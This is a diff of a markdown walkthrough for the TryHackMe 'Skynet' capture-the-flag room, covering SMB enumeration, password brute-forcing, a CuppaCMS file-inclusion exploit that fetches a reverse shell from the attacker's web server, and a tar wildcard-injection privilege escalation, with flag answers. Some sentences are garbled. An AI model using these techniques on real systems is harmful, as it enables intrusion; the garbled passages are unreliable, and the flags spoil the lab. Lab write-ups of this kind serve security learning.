@@ -13,10 +13,13 @@ image:
 
 
 
+
 Sure, I can provide a general walkthrough for the Skynet room on TryHackMe. Here’s a step-by-step guide:
 
 
+
 <h1> Deploy the Machine : </h1>
+
 
 
 Log in to your TryHackMe account and navigate to the Skynet room.
@@ -25,20 +28,26 @@ Click on the “Deploy” button to spawn the virtual machine.
 
 
 
+
 ```bash
 echo "10.10.225.54 Skynet.thm" | sudo tee -a  /etc/hosts
 ```
 
 
+
 ![1](https://github.com/user-attachments/assets/aa3f8c4e-7c70-40f1-9b58-bae4689b4d31)
+
 
 
 <h1>Enumeration:</h1>
 
+
 Start by enumerating the services running on the machine using tools like Nmap.
 
 
+
 <h1>Run a basic Nmap scan to discover open ports and services : </h1>
+
 
 
 
@@ -48,7 +57,10 @@ nmap -sCV <machine_IP>
 
 
 
+
+
 ![10](https://github.com/user-attachments/assets/62fd68f7-3977-4a71-b999-66c002a83b3a)
+
 
 
 
@@ -56,15 +68,19 @@ nmap -sCV <machine_IP>
 <h1>Enumerate Web Service:</h1>
 
 
+
 Once you have identified the open ports, check if there’s a web service running.
 Visit the web service in your browser by navigating to http://<machine_IP>.
+
 
 
 <h1>Examine the Website: </h1>
 
 
+
 Look for any clues or hidden directories on the website. You can use tools like dirsearch for directory brute-forcing.
 Examine the page source for any hidden comments or JavaScript.
+
 
 
 <h1>dirsearch : </h1>
@@ -75,10 +91,13 @@ Examine the page source for any hidden comments or JavaScript.
 
 
 
+
 <h1>smbclient : </h1>
 
 
+
 We have connected to major small businesses using smbclient. To share on the device. Anonymous Miles Dyson.
+
 
 
 
@@ -88,7 +107,9 @@ smbclient -L skynet.thm
 
 
 
+
 ![20](https://github.com/user-attachments/assets/a40e751b-d742-48af-bb2b-f0f4b7cb11db)
+
 
 
 
@@ -101,7 +122,9 @@ smbclient -L skynet.thm
 
 
 
+
 ![30](https://github.com/user-attachments/assets/8dac568c-58df-40e1-a382-302ed4cc2785)
+
 
 
 
@@ -110,14 +133,19 @@ smbclient -L skynet.thm
 
 
 
+
 ![35](https://github.com/user-attachments/assets/1c2b6ff4-5e32-4733-937f-1966683f6db6)
+
 
 
 
 
 <h1>Cracking Squirrelmail password : </h1>
 
+
+
 You can do this easily using Burp Suite and hydra
+
 
 
 
@@ -127,7 +155,9 @@ You can do this easily using Burp Suite and hydra
 
 
 
+
 <h1>Hydra : </h1>
+
 
 
 
@@ -135,7 +165,9 @@ You can do this easily using Burp Suite and hydra
 
 
 
+
 <h1>Burp Suite : </h1>
+
 
 
 
@@ -144,7 +176,9 @@ You can do this easily using Burp Suite and hydra
 
 
 
+
 <h1>We found it! Now we can log in : </h1>
+
 
 
 
@@ -153,7 +187,9 @@ You can do this easily using Burp Suite and hydra
 
 
 
+
 <h1>Only the first looks to be important for us : </h1>
+
 
 
 
@@ -161,7 +197,9 @@ You can do this easily using Burp Suite and hydra
 
 
 
+
 <h1>We found the password for smb, now we can login : </h1>
+
 
 
 
@@ -171,7 +209,9 @@ You can do this easily using Burp Suite and hydra
 
 
 
+
 and we get access, inside are a lot of notes and files that we don’t necessary need, the only file that its usefull for us is important.txt
+
 
 
 
@@ -180,7 +220,9 @@ and we get access, inside are a lot of notes and files that we don’t necessary
 
 
 
+
 ![2](https://github.com/user-attachments/assets/5df13dc7-1319-4750-a499-7cad8f0e30a0)
+
 
 
 
@@ -188,7 +230,9 @@ and we get access, inside are a lot of notes and files that we don’t necessary
 
 
 
+
 <h1>Inside we find the secret directory : </h1>
+
 
 
 
@@ -196,7 +240,9 @@ and we get access, inside are a lot of notes and files that we don’t necessary
 
 
 
+
 If we go to that directory we find a simple page, let’s run dirb to see if there are more hidden directories:
+
 
 
 
@@ -206,11 +252,14 @@ dirb http://10.10.167.117/45kra24zxs28v3yd/
 
 
 
+
 We find /administrator if we go there we find that the page is running CuppaCMS, we can search for it on searchsploit:
 
 
 
+
 ![5](https://github.com/user-attachments/assets/f87d7bb8-cd83-4ea2-8046-3ec2abdc4a8d)
+
 
 
 
@@ -220,12 +269,19 @@ We find /administrator if we go there we find that the page is running CuppaCMS,
 
 
 
+
 ![6](https://github.com/user-attachments/assets/74f047e2-ed5a-4f95-a69d-3a31b724ca94)
 
 
 
+
 <h1>Exploitation : </h1>
+
+
+
+
 We open searchsploit and search for the exploit in The CMS
+
 
 
 
@@ -233,7 +289,9 @@ We open searchsploit and search for the exploit in The CMS
 
 
 
+
 Reading the text file for the exploit, we see that it is possible to read the Local files on the target machine by targeting the urlConfig parameter in the alertConfigField.php. The best part is that it doesn’t even warrant a login into the CMS.
+
 
 
 
@@ -241,7 +299,9 @@ Reading the text file for the exploit, we see that it is possible to read the Lo
 
 
 
+
 we can read the /etc/passwd file on the target divice
+
 
 
 
@@ -252,7 +312,9 @@ http://target/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConf
 
 
 
+
 ![9](https://github.com/user-attachments/assets/69672ff5-91fa-416b-8656-a5210845a78c)
+
 
 
 
@@ -263,9 +325,11 @@ Start a http server in the folder where you downloaded your revshell:
 
 
 
+
 ```bash
 python3 -m http.server
 ```
+
 
 
 
@@ -273,7 +337,9 @@ python3 -m http.server
 
 
 
+
 After executing this on our browser, a reverse shell should be opened on our side
+
 
 
 
@@ -283,7 +349,9 @@ nc -lvnp 1337
 
 
 
+
 <h1> Request the link : </h1>
+
 
 
 
@@ -294,10 +362,13 @@ http://skynet/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConf
 
 
 
+
 Now we get our reverse shell!
 
 
+
 We can spawn a shell with python:
+
 
 
 
@@ -307,13 +378,16 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 
 
 
+
 ```txt
 we see that there is a photo user named Melideson. You Have highlighted the user within their home directory .
 ```
 
 
 
+
 ![10](https://github.com/user-attachments/assets/e81505b9-c1e1-4ca8-ad69-edf27f6fe359)
+
 
 
 
@@ -323,7 +397,9 @@ Answer: 7ce5c2109a40f958099283600a9ae807
 
 
 
+
 Inside /home/milesdyson/backups we find a file backup.sh and see that every minutes a script is being executed, we can perfom a wildcard injection.
+
 
 
 
@@ -331,11 +407,14 @@ Inside /home/milesdyson/backups we find a file backup.sh and see that every minu
 
 
 
+
 We run this commads, inside the folder /var/www/html:
 
 
 
+
 ![12](https://github.com/user-attachments/assets/0eeed21b-1c68-460e-9025-e9b0004c4982)
+
 
 
 
@@ -348,7 +427,9 @@ echo "/var/www/html"  > --checkpoint=1
 
 
 
+
 ![13](https://github.com/user-attachments/assets/aa7b133d-0c71-49c9-8acb-615d174775b2)
+
 
 
 
@@ -359,25 +440,12 @@ And get the root shell, and then we can find the tag /root/root.txt
 
 
 
+
 ```
 Answer: 3f0372db24753accc7179a282cd6a949
 ```
 
 
 
+
 ![14](https://github.com/user-attachments/assets/cf1c459e-fc79-4bb3-93e3-012405016a6a)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
